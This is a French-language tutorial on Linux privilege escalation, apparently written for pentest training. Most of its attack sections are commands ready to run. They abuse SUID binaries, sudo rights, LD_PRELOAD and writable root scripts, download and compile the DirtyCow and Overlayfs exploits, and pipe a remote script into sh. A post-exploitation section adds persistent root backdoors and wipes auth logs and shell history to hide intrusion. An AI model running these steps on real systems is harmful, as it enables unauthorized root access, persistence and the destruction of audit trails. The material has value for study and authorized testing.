# Escalade de Privilèges Linux

## 🔺 Vue d'ensemble

L'**escalade de privilèges** Linux consiste à passer d'un utilisateur limité à **root** (UID 0). C'est souvent l'étape cruciale qui transforme un accès basique en contrôle total du système.

> **💡 Analogie Simple** : C'est comme passer d'employé à PDG de l'entreprise - vous obtenez les clés de TOUT.

## ⚠️ **IMPORTANT - À propos des exemples**

> **🎯 TOUS les chemins, utilisateurs, hashes dans ce guide sont FICTIFS !**

### 📝 Exemples vs Réalité :

**Dans le guide (EXEMPLE FICTIF) :**
```
alice@serveur-test:~$ id
uid=1000(alice) gid=1000(alice)
/opt/custom-app/run.sh
/tmp/linpeas.sh
```

**Dans la vraie vie, vous devez adapter :**
```
votre-user@vraie-machine:~$ id
uid=1001(votre-user) gid=1001(votre-user)
/path/to/real-vulnerable-binary
/tmp/votre-script-enum.sh
```

## 🎯 Objectifs d'apprentissage

Après cette section, vous saurez :
1. **Énumération système** - Identifier les vecteurs d'escalade
2. **Exploitation SUID/SGID** - Binaires avec permissions élevées
3. **Sudo mal configuré** - Abus des droits sudo
4. **Services vulnérables** - Exploitation de démons locaux
5. **Exploitation kernel** - Vulnérabilités du noyau Linux

## 🔍 Phase 1 : Énumération Système

### **Informations système de base**

#### **Identifier le système**
```bash
# Version du système
cat /etc/os-release
lsb_release -a
uname -a

# Architecture
uname -m
arch

# Version du kernel (important pour exploits)
uname -r
cat /proc/version
```

#### **Utilisateur actuel et groupes**
```bash
# Utilisateur actuel
id
whoami

# Groupes d'appartenance
groups
id -Gn

# Autres utilisateurs connectés
who
w
last
```

### **Énumération des permissions sudo**

#### **Vérifier les droits sudo**
```bash
# Commandes autorisées en sudo
sudo -l

# Résultat typique
User alice may run the following commands on serveur-test:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/systemctl restart apache2
    (www-data) /opt/web-app/deploy.sh
```

#### **Configurations sudo dangereuses**
```bash
# ATTENTION à ces permissions :
(ALL) NOPASSWD: ALL                    # Sudo sans mot de passe !
(ALL) /bin/bash                        # Shell direct en root
(ALL) /usr/bin/vim                     # Éditeur = escalade
(ALL) /usr/bin/find                    # Exécution de commandes
(ALL) /usr/bin/less, /usr/bin/more     # Pager = escalade
(ALL) /usr/bin/awk                     # Interpréteur puissant
```

### **Énumération des binaires SUID/SGID**

#### **Recherche de binaires SUID**
```bash
# Tous les binaires SUID sur le système
find / -perm -4000 -type f 2>/dev/null

# SUID avec détails
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null

# SUID appartenant à root
find / -uid 0 -perm -4000 -type f 2>/dev/null
```

#### **Binaires SUID couramment exploitables**
```bash
# Binaires à surveiller particulièrement
/usr/bin/find                 # find . -exec /bin/sh \; -quit
/usr/bin/vim                  # :!/bin/sh
/usr/bin/more                 # !/bin/sh  
/usr/bin/less                 # !/bin/sh
/usr/bin/nano                 # ^R^X puis reset; sh 1>&0 2>&0
/usr/bin/cp                   # Copier /etc/shadow
/bin/bash                     # Shell direct !
/usr/bin/env                  # env /bin/sh
```

### **Services et processus**

#### **Processus en cours d'exécution**
```bash
# Tous les processus avec détails
ps aux
ps -ef

# Processus root intéressants
ps aux | grep "^root"

# Processus par utilisateur
ps aux | grep alice

# Arbre des processus
pstree -p
```

#### **Services réseau locaux**
```bash
# Ports ouverts (services locaux)
netstat -tulpn
ss -tulpn

# Connexions établies
netstat -an
ss -an

# Services écoutant seulement en local (127.0.0.1)
netstat -tulpn | grep 127.0.0.1
```

### **Tâches planifiées**

#### **Cron jobs**
```bash
# Crontab de l'utilisateur actuel
crontab -l

# Crontab système
cat /etc/crontab
ls -la /etc/cron.*
ls -la /var/spool/cron/

# Scripts exécutés par cron
find /etc/cron* -type f -perm -002 2>/dev/null
```

#### **Tâches systemd**
```bash
# Timers systemd
systemctl list-timers
systemctl list-units --type=timer

# Services avec user spécifique
systemctl --user list-units
```

## 🎯 Techniques d'Escalade

### **1. Exploitation de binaires SUID/SGID**

#### **Méthode find**
```bash
# Si /usr/bin/find est SUID root
find . -exec /bin/sh \; -quit

# Ou version plus discrète
find . -name "anything" -exec /bin/bash -i \;
```

#### **Méthode vim/nano**
```bash
# Si /usr/bin/vim est SUID root
vim
:!/bin/sh

# Si /usr/bin/nano est SUID root
nano
Ctrl+R Ctrl+X
reset; sh 1>&0 2>&0
```

#### **Méthode less/more**
```bash
# Si /usr/bin/less est SUID root
less /etc/passwd
!/bin/sh

# Si /usr/bin/more est SUID root  
more /etc/passwd
!/bin/sh
```

#### **Méthode cp (copie stratégique)**
```bash
# Si /bin/cp est SUID root
# Créer un utilisateur root alternatif
echo 'hacker:$6$salt$hash:0:0:root:/root:/bin/bash' > /tmp/newuser
cp /tmp/newuser /etc/passwd

# Ou sauvegarder/modifier des fichiers sensibles
cp /etc/shadow /tmp/shadow.backup
cp /tmp/modified_shadow /etc/shadow
```

### **2. Abus des permissions sudo**

#### **Exploitation directe**
```bash
# Si sudo -l montre ces permissions :

# (ALL) /bin/bash -> Shell direct
sudo /bin/bash

# (ALL) /usr/bin/vim -> Éditeur
sudo vim
:!/bin/sh

# (ALL) /usr/bin/find -> Exécution
sudo find . -exec /bin/sh \; -quit
```

#### **Exploitation indirecte**
```bash
# Si sudo systemctl restart service
# Modifier le service pour exécuter notre code
sudo vim /etc/systemd/system/service.service
# Ajouter : ExecStart=/bin/bash -c 'chmod +s /bin/bash'
sudo systemctl daemon-reload
sudo systemctl restart service
```

#### **Variable d'environnement LD_PRELOAD**
```bash
# Si sudo_mode préserve LD_PRELOAD
# Créer une librairie malveillante
echo 'void _init() { setuid(0); system("/bin/bash"); }' > /tmp/evil.c
gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles

# Exécuter avec LD_PRELOAD
sudo LD_PRELOAD=/tmp/evil.so [commande-autorisée]
```

### **3. Services vulnérables locaux**

#### **Services web internes**
```bash
# Identifier services web locaux
netstat -tulpn | grep ":80\|:8080\|:3000\|:8000"

# Tester pour vulnérabilités
curl http://127.0.0.1:8080/
curl http://127.0.0.1:8080/admin
curl http://127.0.0.1:8080/../../../etc/passwd
```

#### **Bases de données locales**
```bash
# MySQL/MariaDB local
mysql -u root -p
mysql -u root # (sans mot de passe)

# PostgreSQL local
psql -h localhost -U postgres

# Exploitation UDF (User Defined Functions)
# Si accès MySQL en root -> escalade système
```

### **4. Exploitation de fichiers writeable**

#### **Scripts exécutés par root**
```bash
# Recherche de scripts modifiables exécutés par root
find / -type f -perm -002 2>/dev/null | grep -E "\.(sh|py|pl)$"

# Vérifier propriétaire et permissions
ls -la /opt/backup-script.sh
# Si writable : ajouter reverse shell ou chmod +s /bin/bash
echo "chmod +s /bin/bash" >> /opt/backup-script.sh
```

#### **Modification de PATH**
```bash
# Si un script root utilise commandes sans chemin absolu
# Créer faux binaire dans PATH contrôlé
echo '#!/bin/bash' > /tmp/ls
echo 'chmod +s /bin/bash' >> /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
```

### **5. Kernel Exploits**

#### **Identification des vulnérabilités kernel**
```bash
# Version exacte du kernel
uname -r

# Recherche d'exploits
searchsploit linux kernel $(uname -r)
searchsploit ubuntu $(lsb_release -r | cut -f2)

# Sites utiles pour kernel exploits :
# - exploit-db.com
# - github.com/SecWiki/linux-kernel-exploits
```

#### **Exploits kernel courants**
```bash
# DirtyCow (CVE-2016-5195) - Kernel 2.6.22 - 4.8.3
wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/pokemon.c
gcc -pthread pokemon.c -o pokemon
./pokemon

# Overlayfs (CVE-2015-1328) - Ubuntu 12.04-15.10
wget https://www.exploit-db.com/download/37292
gcc 37292.c -o 37292
./37292
```

## 🛠️ Outils d'Énumération Automatisés

### **LinPEAS - Linux Privilege Escalation Awesome Script**
```bash
# Téléchargement et exécution
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Ou version locale
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Avec sortie dans fichier
./linpeas.sh | tee linpeas_output.txt
```

### **LinEnum**
```bash
# Téléchargement
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh

# Exécution avec options
./LinEnum.sh -t -k password -r report.txt
```

### **Linux Exploit Suggester**
```bash
# Version bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# Version Perl (plus détaillée)
wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
perl linux-exploit-suggester-2.pl
```

### **pspy - Monitor sans root**
```bash
# Surveiller les processus lancés par d'autres utilisateurs
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
chmod +x pspy64
./pspy64
```

## 🔧 Post-Exploitation

### **Maintenir l'accès root**

#### **Backdoor via SUID**
```bash
# Copie de bash avec SUID
cp /bin/bash /tmp/.hidden_shell
chmod 4755 /tmp/.hidden_shell

# Utilisation
/tmp/.hidden_shell -p
```

#### **Ajouter utilisateur root**
```bash
# Créer hash de mot de passe
openssl passwd -1 -salt salt motdepasse

# Ajouter dans /etc/passwd
echo 'backdoor:$1$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
```

#### **Clé SSH pour root**
```bash
# Générer paire de clés
ssh-keygen -t rsa -f /tmp/backdoor_key

# Ajouter clé publique pour root
mkdir -p /root/.ssh
cat /tmp/backdoor_key.pub >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
chmod 700 /root/.ssh

# Connexion
ssh -i /tmp/backdoor_key root@target
```

### **Nettoyage des traces**
```bash
# Nettoyer historique
history -c
echo "" > ~/.bash_history

# Nettoyer logs
echo "" > /var/log/auth.log
echo "" > /var/log/secure

# Nettoyer fichiers temporaires
rm -rf /tmp/linpeas.sh /tmp/exploit.c
```

## 📋 Checklist Escalade de Privilèges

### **Phase Énumération**
```bash
☐ sudo -l                           # Droits sudo
☐ find / -perm -4000 2>/dev/null   # Binaires SUID
☐ ps aux                           # Processus actifs
☐ netstat -tulpn                   # Services locaux
☐ crontab -l && cat /etc/crontab   # Tâches planifiées
☐ cat /etc/passwd                  # Utilisateurs système
☐ uname -a                         # Version kernel
☐ ./linpeas.sh                     # Énumération automatisée
```

### **Vecteurs d'attaque prioritaires**
```bash
☐ Sudo NOPASSWD                    # Escalade immédiate
☐ Binaires SUID custom             # Applications tierces
☐ Scripts writeable par root       # Modification de scripts
☐ Services root locaux             # Web apps, databases
☐ Kernel exploits                  # En dernier recours
```

### **Exploitation**
```bash
☐ Test sudo exploitation
☐ Test binaires SUID
☐ Recherche scripts modifiables
☐ Enum services locaux
☐ Kernel exploit si applicable
☐ Vérification accès root obtenu
☐ Installation backdoor
☐ Nettoyage traces
```

## 🎯 Ressources et Références

### **Scripts d'énumération**
- **LinPEAS** : https://github.com/carlospolop/PEASS-ng
- **LinEnum** : https://github.com/rebootuser/LinEnum
- **Linux Exploit Suggester** : https://github.com/mzet-/linux-exploit-suggester
- **pspy** : https://github.com/DominicBreuker/pspy

### **Bases de données d'exploits**
- **Exploit-DB** : https://www.exploit-db.com/
- **CVE Database** : https://cve.mitre.org/
- **Linux Kernel Exploits** : https://github.com/SecWiki/linux-kernel-exploits

### **Références GTFOBins**
- **GTFOBins** : https://gtfobins.github.io/
- **LOLBAS** : https://lolbas-project.github.io/

---
*L'escalade de privilèges Linux demande patience et méthodologie. Énumérez d'abord, exploitez ensuite !* 